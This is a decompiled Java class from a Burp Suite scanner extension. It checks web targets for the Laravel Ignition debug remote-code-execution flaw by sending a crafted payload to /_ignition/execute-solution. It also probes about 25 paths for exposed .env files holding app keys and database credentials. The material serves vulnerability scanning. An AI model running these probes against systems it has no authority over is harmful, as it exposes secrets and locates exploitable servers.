/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package burp.ScanFun;

import burp.BurpExtender;
import burp.Common;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class LaravelScan {
    private static final String[] poc_laravel_env = new String[]{".env", "vendor/.env", "lib/.env", "lab/.env", "cronlab/.env", "cron/.env", "core/.env", "core/app/.env", "core/Database/.env", "database/.env", "config/.env", "assets/.env", "app/.env", "apps/.env", "uploads/.env", "sitemaps/.env", "site/.env", "admin/.env", "web/.env", "public/.env", "en/.env", "tools/.env", "v1/.env", "administrator/.env", "laravel/.env"};
    public static String payload_laravel_debug_rce = "solution=Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&parameters[variableName]=username&parameters[viewFile]=xxxxxxx";

    public static IHttpRequestResponse LaravelDebugRCEScan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        headers.set(0, "POST " + custompath + "/_ignition/execute-solution HTTP/1.1");
        headers.add("Content-Type: application/x-www-form-urlencoded");
        byte[] body = helpers.buildHttpMessage(headers, payload_laravel_debug_rce.getBytes(StandardCharsets.UTF_8));
        IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(reqres.getHttpService(), body);
        String res = Common.getResbody(requestResponse.getResponse(), helpers);
        if (res.contains("ErrorException: file_get_contents(xxxxxxx): failed to open stream: No such file or directory in file")) {
            BurpExtender.scannedDomainURL_laravel_debugrce.add(url.getHost() + ":" + url.getPort());
            return requestResponse;
        }
        BurpExtender.scannedDomainURL_laravel_debugrce.add(url.getHost() + ":" + url.getPort());
        return null;
    }

    public static IHttpRequestResponse LaravelEnvScan(IHttpRequestResponse reqres, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, String custompath) {
        List<String> headers = helpers.analyzeRequest(reqres.getRequest()).getHeaders();
        URL url = helpers.analyzeRequest(reqres).getUrl();
        for (int i = 0; i < poc_laravel_env.length; ++i) {
            String res;
            headers.set(0, "GET " + custompath + "/" + poc_laravel_env[i] + " HTTP/1.1");
            byte[] body = helpers.buildHttpMessage(headers, null);
            IHttpRequestResponse laravelenvreqres = callbacks.makeHttpRequest(reqres.getHttpService(), body);
            try {
                Thread.currentThread();
                Thread.sleep(Integer.parseInt(BurpExtender.sleep_value.getText()));
            } catch (InterruptedException e) {
                BurpExtender.stdout.println(e.getMessage());
            }
            if (laravelenvreqres == null || laravelenvreqres.getResponse() == null || !(res = Common.getResbody(laravelenvreqres.getResponse(), helpers)).contains("APP_KEY") || !res.contains("APP_NAME") || !res.contains("DB_CONNECTION")) continue;
            BurpExtender.scannedDomainURL_laravel_env.add(url.getHost() + ":" + url.getPort());
            return laravelenvreqres;
        }
        BurpExtender.scannedDomainURL_laravel_env.add(url.getHost() + ":" + url.getPort());
        return null;
    }
}

